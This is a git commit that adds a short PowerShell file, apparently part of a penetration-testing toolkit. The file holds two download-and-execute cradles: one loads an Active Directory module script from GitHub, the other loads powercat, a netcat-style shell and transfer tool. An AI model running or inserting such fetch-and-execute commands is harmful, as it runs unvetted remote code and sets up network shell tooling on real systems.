1d629a39511ded0f75270eb6f8516a5315063b38
calvin <74103103+Calvindd2f@users.noreply.github.com>
2022-09-09 12:49:24 +0100

    Create iex.ps1
    Great

---
+++ Modules/iex.ps1
@@ -0,0 +1,4 @@
+# Active Directory without RSAT
+iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
+# powercat
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
